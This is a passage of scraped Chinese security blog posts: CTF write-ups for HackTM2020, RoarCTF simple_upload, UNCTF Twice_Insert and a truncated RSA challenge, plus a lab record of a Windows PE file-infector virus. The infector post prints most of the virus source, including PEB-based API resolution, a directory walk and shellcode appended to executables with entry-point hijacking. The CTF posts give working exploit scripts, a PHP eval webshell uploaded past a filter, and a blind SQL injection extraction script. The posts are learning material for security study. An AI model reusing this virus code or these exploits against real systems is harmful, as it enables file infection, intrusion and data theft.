users[uid] }));}); 但是想要插入rigths必须绕过isAdmin(user)的判断，同时还有isValidUser(user)的判断： function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();}function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() );} 可以利用下面的方式仿造admin： var admin = \"hacktm\";var user = \"hacKtm\"; 结果满足条件： \"hacKtm\".toLowerCase() == \"hacktm\".toLowerCase() // true\"hacKtm\".toUpperCase() === \"hacktm\".toUpperCase() // false 然后即可插入rigths，插入的时候需要经过checkRights(rights)的判断： function checkRights(arr) { let blacklist = [\"p\", \"n\", \"port\"]; for (let i = 0; i &lt; arr.length; i++) { const element = arr[i]; if (blacklist.includes(element)) { return false; } } return true;} 我们看到，黑名单中限制了p和n的上传，可以通过利用数组作为键的方式绕过： \"rights\":[[\"n\"]] 从而即可读取到n，然后通过使p==n，q==1，即可使req.user.id==0，从而拿到flag。 Expoit参照大佬脚本：获取n，p： import requestsurl = \"http://167.172.165.153:60001\"# create user with the admin usernameresp = requests.post(url + \"/login\", json={\"username\": \"hacKtm\"})resp.raise_for_status()token = resp.json()['data']['token']print(\"[*] Created user with admin username\")# add illegal rightsresp = requests.post(url + \"/updateUser\", json={\"rights\": [[\"n\"], [\"p\"]]}, headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] updated rights\")# fetch secret config valuesresp = requests.get(url + \"/serverInfo\", headers={\"Authorization\": \"Bearer %s\" % token})resp.raise_for_status()print(\"[*] fetched secret config values\")server_info = resp.json()for key in server_info[\"data\"][\"info\"]: if isinstance(key[\"name\"], list): print(\"[*] %s = %s\" % (key[\"name\"][0], key[\"value\"])) 获取flag： import jwt # pip install pyjwtdata = { \"p\": \"54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979\", \"q\": \"1\"}resp = requests.post(url+\"/init\", json=data)token = resp.json()['data']['token']jwt_claim = jwt.decode(token, verify=False, algorithms=['HS256'])assert jwt_claim['id'] == 0resp = requests.get(url+\"/flag\", headers={\"Authorization\": \"Bearer %s\" % token})print(resp.json()) 关于node.js的考核可以参考Pcat师傅分享的题解：https://xz.aliyun.com/t/7177Bonus！从大佬那拿到了一个画画机器人代码，简单实用！ import sysimport osimport structimport jsonimport requestsfrom PIL import Image # pip install pillow-simd requestsurl = \"http://167.172.165.153:60001\"def get_color_token(_hex): resp = requests.post(url+\"/login\", json={\"username\": \"hacKtm\"}) resp.raise_for_status() token = resp.json()['data']['token'] data = {\"color\": int(_hex, 16)} resp = requests.post(url+\"/updateUser\", json=data, headers={\"Authorization\": \"Bearer %s\" % token}) resp.raise_for_status() return tokenimg = Image.open(sys.argv[1])img = img.convert(\"RGBA\")pix = img.load()os.popen(\"rm output/*\").read()output = {}numcolors = []hexlookup = {}data = {}hexi = lambda k: struct.pack('B', k).hex()i = 0for x in range(0, img.width): for y in range(0, img.height): r, g, b, a = pix[x, y] if a == 0: continue cc = (r, g, b) if cc not in numcolors: numcolors.append(cc) i += 1 hexlookup.setdefault(cc, f\"{hexi(r)}{hexi(g)}{hexi(b)}\") data.setdefault(hexlookup[cc], []) data[hexlookup[cc]].append((x, y))for k, v in data.items(): f = open(\"output/%s.txt\" % k, \"a\") for coord in v: x, y = coord f.write(\"%s\\n\" % json.dumps({\"x\": x, \"y\": y})) f.close()for k, v in data.items(): f = open(\"output/%s.sh\" % k, \"a\") f.write(\"#!/bin/bash\\n\\n\") token = get_color_token(k) cmd = \"\"\"curl -vv -XPOST -m3 -s --data \"$1\" -H \"Content-Type: application/json\" -H \"Authorization: Bearer %s\" %s/paint\"\"\" % ( token, url ) f.write(cmd) f.write(\"\\n\") f.close() print(\"parallel -j +10 ./output/%s.sh &lt; output/%s.txt\" % (k, k))os.popen(\"chmod +x output/*.sh\").read() 用法 1、该脚本利用题目提供的JSON像素数据获取一个120*80的PNG图像(比如这个题目就给了包含像素数据的JSON) 2、生成像素数据：python main.py &quot;image.png&quot; 3、像素数据在output/中 4、该脚本将输出可以运行的GNU并行命令这个题目确实学到了很多。 总结简单的可以做，难的做不出，但是学到很多，继续努力！ヾ(◍°∇°◍)ﾉﾞ","link":"/2020/02/04/HackTM2020-WriteUp/"},{"title":"MaliciousCode-FileInfect","text":"MaliciousCode-FileInfect本篇博客的主要目的在于记录学习，由于内容涉及不安全因素，不做特别详细的解释，学习需要的可以私信。这是一篇对一个实验项目的记录，实验的目的和关键如下： 实验目的：编写shellcode，通过利用系统动态链接库调用API从而实现对目标文件夹内文件的感染。 相关知识：需要熟知PE文件结构 涉及到的API有：CreateFileA、GetFileSize、CreateFileMapping、MapViewOfFile、UnmapViewOfFile、CloseHandle、FindFirstFileA、FindNextFileA、FindClose、LoadLibraryA、GetProcAddress 主要思路1、通过C+汇编编程找到kernel32.dll的地址，从而才能进一步查找其他API的地址；2、利用PE文件结构找到各类函数的地址；3、然后利用API对目标文件夹内的文件进行感染。 主要代码分析前面说了本篇博客的主要目的是记录学习，所以放一些主要部分的代码以供学习参考。下面我们对主要函数进行分析： 1、GetKernel32Base函数功能是获取系统kernel32.dll加载到内存中的基址，需要对Windows的PEB以及PE结构有比较深的认识，这里可以参考FREEBUF上的三篇博客：https://www.freebuf.com/articles/system/93983.htmlhttps://www.freebuf.com/articles/system/94774.htmlhttps://www.freebuf.com/articles/system/97215.html主要代码如下： DWORD GetKernel32Base(){ DWORD base; _asm { xor ecx, ecx; mov eax, fs:[ecx + 0x30]; //EAX = PEB mov eax, [eax + 0xc]; //EAX = PEB-&gt;Ldr mov esi, [eax + 0x14]; //ESI = PEB-&gt;Ldr.InMemOrder lodsd jmp Get_Function L1 : xchg eax, esi; lodsd Get_Function : mov ebx, [eax + 0x28]; cmp dword ptr[ebx], 0x0045004B; //前四字节 jnz L1 cmp dword ptr[ebx + 0x4], 0x004E0052; //下一个四字节 jnz L1 cmp dword ptr[ebx + 0x8], 0x004C0045; //第三个四字节 jnz L1 mov ebx, [eax + 0x10]; //EBX = Base address mov base, ebx; } return base;} 这里我自己写了一个通过比对DLL名称来查找目标DLL的函数，以增强不同Windows系统版本的适用性。 2、GetAllAPIAddress函数的功能是查找所有目标API的地址，代码如下： void GetAllAPIAddress(DWORD DllBase,char * ApiNameBase){ int i = 0; DWORD * p = (DWORD *)(ApiNameBase + API_ADDRESS_OFFSET); //在存放函数名的160个字节后面紧跟着存放函数地址 while( *((WORD *)(ApiNameBase + i)) != 0) { *p = GetAPIAddress((unsigned char *)DllBase, //把函数地址逐个存到p指向的位置 ApiNameBase + i); p++; while ( *(ApiNameBase + i) != 0) i++; //将地址指针指向下一个需要对比的函数名的开头字符处 i++;//每一个字符串后只有一个0结尾 } } 该函数调用GetAPIAddress函数逐个查找ApiName数组中存放的函数名，让后将地址保存到160个字节的数组空间的后面，通过判断字符串尾部\\x0判断字符串的结束，以这种方式逐个查找函数地址。 3、GetAPIAddress我们从GetAllAPIAddress的代码中看到，它是通过调用GetAPIAddress来查找到每一个API的地址的，主要也是利用PE文件的结果实现的： DWORD GetAPIAddress(unsigned char * pDllBase,char * ApiName){ unsigned char * DllApiName; int index; PIMAGE_DOS_HEADER pdos_head; PIMAGE_NT_HEADERS32 pPeHeader; PIMAGE_EXPORT_DIRECTORY pExport; pdos_head = (PIMAGE_DOS_HEADER )pDllBase; //此处是得到了DOS头的基址，后面找其他结构都是偏移地址，加上此处的基址才是实际在内存的地址 pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)pdos_head + pdos_head-&gt;e_lfanew);//得到PE文件头的位置 //得到导出表的位置VA pExport = (PIMAGE_EXPORT_DIRECTORY)&amp;pDllBase[ pPeHeader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress]; index = 0; //函数地址的索引 while(index &lt; pExport-&gt;NumberOfNames) { DllApiName = pDllBase + *((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfNames + (index &lt;&lt; 2)]) ; //将索引左移2bit是扩大四倍，因为地址是四个字节 if (CmpStr(ApiName,(char *)DllApiName) == TRUE) break; //对比函数名，从而找到函数地址，成功则跳出循环 index ++; } if (index == pExport-&gt;NumberOfNames) return 0; //查找失败，返回0 index = ((WORD *)&amp;pDllBase[pExport-&gt;AddressOfNameOrdinals])[index]; return ((DWORD *)&amp;pDllBase[pExport-&gt;AddressOfFunctions])[index] + pPeHeader-&gt;OptionalHeader.ImageBase;//函数名对应的偏移地址加镜像基址，即得到了函数在内存中的地址} 该函数通过传入的pDllBase(其实就是kernel32.dll在内存中的基址)，找到dll文件的PE头位置，然后利用PE头结构找到其中可选头里的导出表，kernel32.dll的导出表里AddressOfNameOrdinals存储了函数名序号表的RVA，这里利用index索引进行比较，比对成功后，最后返回的时候加上镜像基址ImageBase就拿到了函数地址. 这里我们可以参考导出表结构: 4、SearchDirectory代码如下： void SearchDirectory(DWORD * ApiAddressArray){ MyFindFirstFileA f_FindFirstFile; MyFindNextFileA f_FindNextFile; MyFindClose f_FindClose; WIN32_FIND_DATA FindFileData; //装载与找到的文件有关的信息 char buf[512];// = \"c:\\\\test\\\\*.exe\";//\"c:\\test\\*.exe\" int i; HANDLE hFind; //strcpy(buf,\"c:\\\\test\\\\*.exe\"); *((DWORD *)buf) = 't\\\\:c'; *((DWORD *)(buf + 4)) = '\\\\tse'; *((DWORD *)(buf + 8)) = 'xe.*'; *((DWORD *)(buf + 12)) = 'e'; f_FindFirstFile = (MyFindFirstFileA)(*(ApiAddressArray + FindFirstFileA_OFFSET));//调用FindFirstFileA函数搜索指定文件夹 f_FindNextFile = (MyFindNextFileA)(*(ApiAddressArray + FindNextFileA_OFFSET)); //该函数判断当前目录下是否有下一个目录或文件 f_FindClose = (MyFindClose)(*(ApiAddressArray + FindClose_OFFSET)); //释放由FindFirstFileA分配的内存 hFind = f_FindFirstFile(buf,&amp;FindFileData); //把找到文件有关信息存入FindFileData if (hFind != INVALID_HANDLE_VALUE) { do { for(i = 0; FindFileData.cFileName[i]!= 0; i++) { buf[8 + i] = FindFileData.cFileName[i]; } buf[8 + i] = 0; //从8个偏移的位置开始把找到的文件名写入buf，从而构造一个文件完整的路径，并且将字符串末尾置0表示结束 MyInfect(ApiAddressArray,buf); }while (0 != f_FindNextFile(hFind,&amp;FindFileData)); //判断是否还有文件，若没有，则感染结束 f_FindClose(hFind); //释放由FindFirstFileA分配的内存 }} 该函数主要利用FindFisrtFileA、FindNextFileA、FindClose三个API完成打开文件、对指定文件夹进行遍历、最后关闭句柄内存的过程。，每成功找到一个文件便调用MyInfect函数对该文件进行感染。 5、MyInfect代码如下： BOOL MyInfect(DWORD * ApiAddressArray, char * FileName){ void * pBase; DWORD VirusSize; DWORD VirusStart = (DWORD)ApiAddressArray - 160 - 7; //从函数地址数组地址往前160字节是函数名数组起始位置，再往前7字节是main.cpp种的前几条指令 VirusSize = 0x2000; //写入shellcode的大小，根据程序内部的情况设置太大不好，设置太小也不行 pBase = MapFileToMemory(ApiAddressArray, FileName); if (pBase == NULL) { return FALSE; } if (PutShellcodeToLastSection_0(pBase,(char *)VirusStart,VirusSize) == FALSE) { return FALSE; } WriteToFile(ApiAddressArray, pBase); return TRUE;} MyInfect函数里对写入shellcode的起始位置进行了设置：VirusStart，同时设置了写入shellcode的大小的VirusSize，这个大小由项目生成的可执行程序里的text节的尺寸决定，因为shellcode都在此节内存着。然后调用MapFileToMemory函数得到映射视图文件的开始地址值并赋值给pBase，然后调用PutShellcodeToLastSection_0函数对目标文件进行感染，成功感染之后，调用WriteToFile函数停止当前程序的一个内存映射，将映像到内存中的文件写回磁盘。 6、MapFileToMemory代码如下： void * MapFileToMemory(DWORD * ApiAddressArray, char * FileName ){ HANDLE hFile, hMapping; DWORD FileSize; MyCreateFileA f_CreateFileA; MyGetFileSize f_GetFileSize; MyCreateFileMappingA f_CreateFileMappingA; MyMapViewOfFile f_MapViewOfFile; MyCloseHandle f_CloseHandle; void * pBase; f_CreateFileA = (MyCreateFileA) (*(ApiAddressArray + CreateFileA_OFFSET)); f_GetFileSize = (MyGetFileSize) (*(ApiAddressArray + GetFileSize_OFFSET)); f_CreateFileMappingA = (MyCreateFileMappingA) (*(ApiAddressArray + CreateFileMapping_OFFSET)); f_MapViewOfFile = (MyMapViewOfFile) (*(ApiAddressArray + MapViewOfFile_OFFSET)); f_CloseHandle = (MyCloseHandle) (*(ApiAddressArray + CloseHandle_OFFSET)); hFile = f_CreateFileA(FileName, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);//打开要感染的目标文件，并用hFile句柄与之关联 if (hFile == INVALID_HANDLE_VALUE) { return NULL; } FileSize = f_GetFileSize(hFile,NULL);//获取文件大小 //创建文件映射 if (!(hMapping = f_CreateFileMappingA(hFile, 0, PAGE_READWRITE | SEC_COMMIT, 0, FileSize + 20*1024, 0))) //为何高32位为0，低32位这么大？ { f_CloseHandle(hFile); //CreateFileMappingA返回0则创建失败，关闭句柄 return NULL; } //将文件内容映射到内存中，并获取内存的首地址，写入m_BasePointer，映射方式：将文件映射对象hMapping映射到当前应用程序的地址空间 if (!(pBase = f_MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, 0))) { f_CloseHandle(hMapping); //如果返回0则映射失败，并关闭两个句柄，成功则返回映射视图文件的开始地址值到pBase f_CloseHandle(hFile); return NULL; } f_CloseHandle(hMapping); f_CloseHandle(hFile); return pBase;} 此函数通过调用CreateFileA、GetFileSize、CreateFileMappingA、MapViewOfFile、CloseHandle等API，将指定的文件打开，如果成功打开文件，则获取文件的大小，然后将文件映射到内存并获取映射到内存中的首地址，并返回给pBase。 7、PutShellcodeToLastSection_0代码如下： BOOL PutShellcodeToLastSection_0(void * pBase,char * pVirus,DWORD VirusSize){ int addsize; int temp; IMAGE_DOS_HEADER * dos_head; PIMAGE_SECTION_HEADER pLastSectionInfo; IMAGE_NT_HEADERS32 * pPeHeader; DWORD CopyPos; DWORD OldEntryPointRVA; dos_head = (IMAGE_DOS_HEADER *)pBase; //基址指向可执行文件的dos头 pPeHeader = (IMAGE_NT_HEADERS32 *)((char *)dos_head + dos_head-&gt;e_lfanew);//得到PE文件头的位置 pLastSectionInfo = GetLastSectionInfo(pBase); if (!IfLastSectionCanBeInfected(pLastSectionInfo)) return FALSE; if ((addsize = NeedLastSectionEnlargeSize(pLastSectionInfo,VirusSize)) != 0)//需要扩大节的大小 { temp = AlignToFile(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData + addsize); pPeHeader-&gt;OptionalHeader.SizeOfImage += AlignToSection(pPeHeader,temp) - AlignToSection(pPeHeader,pLastSectionInfo-&gt;SizeOfRawData); pLastSectionInfo-&gt;SizeOfRawData = temp; } //修改节属性，使之属于可执行节 pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ; //设定新的入口点，指向病毒shell OldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//记录旧的入口点 pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo); //把病毒shell拷贝到尾节的位置 CopyPos = GetShellcodeRawPos(pLastSectionInfo); pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize; for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//在文件中最后一节后面逐个写入设立了code *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //在最后一节的EntryPointPos大小的偏移处写入旧的入口点 return TRUE;} 该函数利用上一个函数传回的pBase，以及VirusStart和VirusSize，将指定位置和长度的shellcode写入pBase指向的文件内存映射中。由函数的前半部分代码逻辑我们可知，该函数先通过pBase得到待感染文件的DOS头，然后利用如图的结构找到PE头然后利用IfLastSectionCanBeInfected函数判断文件的最后一节是否可以被感染，函数主要判断最后一节是否时可丢弃的或者该块的大小是否超过了物理大小而判断是否可以被感染。某一节块是否能被感染的属性如下图：判断了是否能被感染之后，如果可以被感染，则调用NeedLastSectionEnlargeSize函数判断最后一节的大小是否足够写入shellcode，函数返回零则不必扩大，返回大于0的值即为需要扩大的尺寸，便继续执行代码利用AlignToFile和AlignToSection进行扩大节的操作。此过程结束后，便可以正式进行shellcode写入了，代码： //修改节属性，使之属于可执行节pLastSectionInfo-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE ;//设定新的入口点，指向病毒shellOldEntryPointRVA = pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint;//记录旧的入口点pPeHeader-&gt;OptionalHeader.AddressOfEntryPoint = GetShellcodeRVA(pLastSectionInfo);//把病毒shell拷贝到尾节的位置CopyPos = GetShellcodeRawPos(pLastSectionInfo);pLastSectionInfo-&gt;Misc.VirtualSize += VirusSize;for(temp = 0; temp &lt; VirusSize; temp++) ((char *)pBase)[CopyPos + temp] = pVirus[temp];//在文件中最后一节后面逐个写入设立了code*((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; //在最后一节的EntryPointPos大小的偏移处写入旧的入口点 该部分代码先对节的属性进行修改，使之成为可执行的，然后记录旧的入口点到OldEntryPointRVA，并通过GetShellcodeRVA函数拿到写入shellcode之后的新入口点。然后利用GetShellcodeRawPos函数得到写入shellcode的位置，即最后一节的末尾处，至此便正式进行shellcode的写入，利用for循环将shellcode写入文件。 关键点之一：EntryPointPos这一点很重要，在EntryPointPos偏移处写入程序原来的入口点，EntryPointPos在项目中起始的赋值为0xea，即234字节的偏移，这里我们着重讲一下:通过分析被写入的shellcode的结构，如下图：计算得知，红线以上部分存入的是主函数中的push 89898989h(为写入旧的入口点保留的四字节空间)前的234字节的汇编指令和数据：函数名和函数的地址（函数的地址写入到了函数名数组向后偏移160个字节的位置），而89898989h处的四个字节则是通过下面的代码被覆盖成函数原来的入口点的地址： *((DWORD *)(&amp;((char *)pBase)[CopyPos + EntryPointPos])) = OldEntryPointRVA + pPeHeader-&gt;OptionalHeader.ImageBase; 这一点很重要，因为当我们需要向函数名数组中加入新的API函数名时，存储函数地址的空间也会变大，那么写入89898989h的位置则会向后移动，欲覆盖此位置则需要改变EntryPointPos的大小，从而保证能够正确跳转会原入口点使程序正常运行。 8、main最后看一下主函数： __declspec(naked) void MyEntryPoint(){ _asm { pushad //将所有的32位通用寄存器压入堆栈 pushfd //然后将32位标志寄存器EFLAGS压入堆栈 call L1 //利用call/pop组合压入数据 } _MYDATA _asm {L1: pop ebx } RealBegin(); _asm { popfd //32位标志寄存器出栈 popad //32位通用寄存器出栈 mov eax,fs:[30h] mov eax,[eax + 08h] cmp dword ptr [eax + 2],'xxxx' //判断是否是自身程序 jz L2 //如果找到了标志，程序结束 push 89898989h //为程序原入口点开辟四个字节的空间L2: ret }} 主函数利用call/pop组合将_MYDATA中存放的函数名压入栈，然后调用RealBegin函数实现恶意代码的注入，RealBegin函数中都是利用前面提到的函数来实现功能，不过的赘述。这里，通过比对魔数MZ后四个字节的值是否为xxxx来判断程序是我们写的恶意程序本身还是被感染的函数，从而根据判断结果决定退出执行还是写入89898989h这个存放入口点的位置。 其他关键内容在编写和完善代码的过程中，很多细节需要注意，否则就会出现难以预期的问题，我在实验过程中遇到的几个关键问题如下：1、设置VirusSize的大小对VirusSize进行设置，这个地方我们先设置个适当大点的值0x2000，调试之后查看生成可执行文件的text节的大小，然后应当用扩大之后替换VirusSize之前的值。由图可知可以将VirusSize设置为比0x838稍微大的值，以免感染文件写入shellcode时写不全。不过设置的再大些也没有问题，前提是能存下shellcode。2、偏移EntryPointPos的设置代码中对EntryPointPos的定义如下： #define EntryPointPos 0xf2 //0xea=234、0xf2=242，这个是写入原入口点的位置，如果读入别的函数地址，这个偏移需要更改，这里为了弹出窗口，//我们又读入了两个函数的地址，因此向后多偏移了8个字节，故入口点写入的位置也要向后偏移8个字节。 前面提到了这是记录写入原入口点地址偏移的地方，比如当读取10个函数的地址的时候，该偏移大小为0xea恰好能偏移到89898989h的地方，然后覆盖成为原入口点地址，而当我们又多读取了两个函数的地址，那么89898989h也将会向后移动8个字节（这一点是不一定的，因为我们加入两个函数名，160个字节大小的数组空间足够放下函数名，故API_ADDRESS_OFFSET的值160不用变，而当需要加入其它API名的时候，160个字节存不下函数名时，这个地方也要扩大，向后偏移的大小会更大，所以需要根据实际情况来分析），我们可以通过观察文件结构来分析，更为直观： 1、首先，我们写入新的两个函数之后，不对EntryPointPos进行更改，那原程序的入口点（实验中用到的calc.exe的原始入口点的VA为01012475h）将会仍然被写到偏移为0xea的地方，而89898989h将会存在于后面几个字节的地方，如图：红色框内是入口点写入到0xea个偏移的位置，黄色标记是89898989h被写入的地方，没有成功被覆盖，因此被感染的程序最后只能蜂鸣而不能正常运行。 2、修改程序，将EntryPointPos改为0xf2(242)，然后再次感染，看一下效果：我们发现01012475h被写入到原来的89898989h位置，经过测试，成功感染。此时便能利用LoadLibraryA和GetProcAddress函数找到MessageBoxA进行弹窗。 总结自己在本次实验中深刻学习了感染目标程序的机制，关键点就在于：写入shellcode、更改入口点等主要作用的实现都离不开对PE文件结构的操作。基础不牢、地动山摇呀！最后再次声明：本篇博客只用于记录学习！","link":"/2020/02/03/MaliciousCode-FileInfect/"},{"title":"RoarCTF-simple_upload-WriteUp","text":"话说…这个题从打比赛到后来的复现，一直想着是爆破文件名，但是也一直没跑出来，条件竞争又竞争不过…后来偶然才发现另一种思路，新大陆🧐 RoarCTF-simple_upload tip：该题目在BUUCTF的题库里有环境可复现：https://buuoj.cn 题目描述打开题目链接之后，看到如下代码 &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller{ public function index() { show_source(__FILE__); } public function upload() { $uploadFile = $_FILES['file'] ; if (strstr(strtolower($uploadFile['name']), \".php\") ) { return false; } $upload = new \\Think\\Upload();// 实例化上传类 $upload-&gt;maxSize = 4096 ;// 设置附件上传大小 $upload-&gt;allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型 $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录 $upload-&gt;savePath = '';// 设置附件上传子目录 $info = $upload-&gt;upload() ; if(!$info) {// 上传错误提示错误信息 $this-&gt;error($upload-&gt;getError()); return; }else{// 上传成功 获取上传文件信息 $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; echo json_encode(array(\"url\"=&gt;$url,\"success\"=&gt;1)); } }} 可以发现，该站是ThinkPHP写的一个文件上传网站。 题目分析 1、分析代码可知，该站可以通过POST方法实现上传文件功能，但是从第14行代码发现php后缀的文件被禁止上传，因此我们需要想办法绕过限制，上传php小马。 2、该脚本通过allowExts方法设置上传类型，但是查阅资料得知这种使用方法是不对的，并不能限制上传的文件类型。 3、upload()函数不传参时为多文件上传，整个$_FILES数组的文件都会上传保存，可以利用该属性通过一次访问上传多个文件。结合以上分析得知的内容可知，可以利用$_FILES数组上传多个文件来绕过对php的过滤。 解题过程1、测试上传功能首先编写python脚本向网站POST一个非php的文件，这里上传了一个txt文件，测试能否正常上传文件，下面是上传测试代码段： url = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello')}r = requests.post(path, files=files)print(r.text) 回显内容如下: {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db1841fb439d.txt\",\"success\":1} 能够成功上传文件。 2、测试上传php文件：url = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello'), \"file1\":(\"ma.php\", '&lt;?php eval($_GET[\"cmd\"]);')}r = requests.post(path, files=files) 回显内容如下： {\"url\":\"\\/Public\\/Uploads\\/2019-10-24\\/5db18420027a3.txt\",\"success\":1}{\"url\":\"\\/Public\\/Uploads\\/\",\"success\":1} 由回显可知，我们成功上传了php文件,但是并没有回显php的文件名 其实在比赛做赛题的时候发现，直接上传php文件也是可以成功的，只不过也不会回显文件名。 通过多次上传发现规律：新文件名是以微秒为单位转十六进制的字符串（后来在WP中了解到ThinkPHP中，文件名是通过uniqid函数生成的，uniqid函数是基于以微秒计的当前时间计算的）因此找到php的文件名，理论上就可以成功连接到我们上传的小马，而方法只有一个，那就是爆破。 3、爆破php文件名爆破代码如下： import requestsurl = \"http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn\"path = url + \"/index.php/home/index/upload\"files = {\"file\":(\"ma.txt\",'hello'), \"file1\":(\"ma.php\", '&lt;?php eval($_GET[\"cmd\"]);')}r = requests.post(path, files=files)t1 = r.text.split(\"/\")[-1].split(\".\")[0]print (t1)s = \"1234567890abcdef\"for i in s: for j in s: for k in s: path = url + \"/Public/Uploads/2019-10-24/\" + t1[:-3] + \"%s%s%s.php\" % (i, j, k) r = requests.get(path, timeout=1) print(path) if r.status_code != 404: print(path) # print(r.text) break 由于我们是利用$_FILES数组的属性实现一次访问，上传两个文件，因此中间相隔的时间较短，利用以上单线程的爆破即可拿到php的文件名，然后常规操作连接小马拿flag。这里还有另一种方法是利用BP进行爆破，只需爆破文件名的后三个字符即可，其实原理是一样的，只是工具不同而已。但是在BUUCTF的站上使用BP爆破时会回显429 Too Many Requests (太多请求),同样如果用自己的多线程代码去爆破也会遇到这个问题，是网站为了限制客户端的请求数量的配置，没办法，只能用单线程。 总结在比赛的时候，由于不了解代码中一次访问可以上传多个文件的漏洞，便采用了上传三次文件的方法（第一次上传txt，第二次传php小马，第三次再传txt，以此得到命名范围），这就导致第一次和第三次拿到的文件名范围比较广，爆破困难，当时自己写了个蹩脚的多线程，最终也没能成功爆破出文件名…赛后看了几个WP关键步骤还是在于爆破文件名，我采用的这种方法也有人成功拿到了flag…不过正解应该还是利用漏洞一次上传多个文件来爆破吧。","link":"/2020/02/02/RoarCTF-simple_upload-WriteUp/"},{"title":"UNCTF-Twice_Insert WriteUp","text":"UNCTF大法好 UNCTF-Twice_Insert原理分析题目提示twice-insert，分析是利用二次注入获取admin密码或者是暴库拿flag。 解题过程1）访问目标主机，打开页面发现是sqli-labs-24，原题是利用二次注入修改admin密码，这题修改admin密码却没有flag，要想拿到flag可能需要爆库。2）根据题意，尝试布尔盲注 发现or被过滤，如此需要换一个思路，因为有注册按钮，尝试注册新用户。 3)注册一个新用户scl，password为1，然后注册用户scl’and 1#（该用户名用于测试注入），password为1，用于后面的测试修改用户scl’and 1#的密码为0修改成功：4)将scl的密码重置为1：注册新的用户scl’and 0#，password为1，然后登陆该账号修改密码回显如下：密码更新失败，说明存在布尔盲注。 编写EXP写python脚本，通过多次注册用户、修改密码，进行暴库。 #coding = utf-8import requestsurl = \"http://183.129.189.60:10003/sqli/Less-24/login_create.php\"url1 = \"http://183.129.189.60:10003/sqli/Less-24/login.php\"url2 = \"http://183.129.189.60:10003/sqli/Less-24/pass_change.php\"#将密码改回1def change21(): user = \"scl\" s = requests.session() data = { \"login_user\": user, \"login_password\": '0', \"mysubmit\": \"Login\" } r = s.post(url1, data) data = { \"current_password\": '0', \"password\": '1', \"re_password\": '1', \"submit\": 'Reset' } r = s.post(url2, data)def second(): flag = \"\" tmp = 1 for i in range(1, 50): if tmp == 0: break tmp = 0 for j in range(32, 127): s = requests.session() user = \"scl'and ascii(substr((select database()),\" + str(i) + \",1))=\" + str(j) + \"#\" print user # 注册用户名 data = { \"username\": user, \"password\": '1', \"re_password\": '1', \"submit\": \"Register\" } r = s.post(url, data) # 登录用户 data = { \"login_user\": user, \"login_password\": '1', \"mysubmit\": \"Login\" } r = s.post(url1, data) # print r.content.decode() if \"YOU ARE LOGGED IN AS\" in r.content.decode(): print \"login ok\" # 更改密码 data = { \"current_password\": '1', \"password\": '0', \"re_password\": '0', \"submit\": 'Reset' } r = s.post(url2, data) if \"successfully updated\" in r.content.decode(): flag += chr(j) tmp = 1 print \"change ok\" change21() break print flagsecond() 总结这个题目的类型是第一见，在北京联合大学举办的UNCTF里面第一次见到，然后昨天去打web安全的省赛又遇到了（安恒真会省事），当时拿到环境复现了一下，但是由于服务器原因，没有跑出完整的flag，但是是第一次见这类的题，写个题解学习一下。","link":"/2020/02/02/UNCTF-Twice_Insert-WriteUp/"},{"title":"HEBCTF-easy_RSA-WriteUp","text":"很久之前做的一道题了，当时还没搭博客，只写了md，现在刚好放博客上，nice~😎 HEBCTF-easy_RSA题目代码from gmpy2 import *from Crypto.Util import number#e = have a try~p = number.getPrime(1024)q = number.getPrime(1024)nothing = 251560377963038761190200797029988859033 # getPrime(128)n = p*qfn = (p-1)*(q-1)d =inverse(e, fn)something=(p-1)d+nothingenc = pow(flag, e, p*q)print (n)#n=14284898343409519110893988467316511926370451139898930447913929171639157662416924629721731319745621456628886461208084701377746738712806909510733763533111440296587773645965346813837315287791601828684827959213005394017782134099259170149915437025962624405554913909119787918969678680969013413675883687099548278972115691260909326823826733899687527221094134484324195895781497056688836390217827814939835994217942643008875830529445666479044655104422017227768913567208280346040068940328073829553819676484041944265736136407848750757258471249497666545068872011229067294045688552723745158600169354377516976789338341197514239514943print(s)#something=28651378351561492296448731763303084502219976433452370417285790046820732827560154648340771101870275056903037785645772913472558503534027385069637279497156205709787856832214536045561611480533720432099579495691235465109169365715642265888116086597526872745003216542547353369341030438137109583109111858374694877472540573948732545890366018934897184236460773924222529396721550119142177470987907807607416178900491362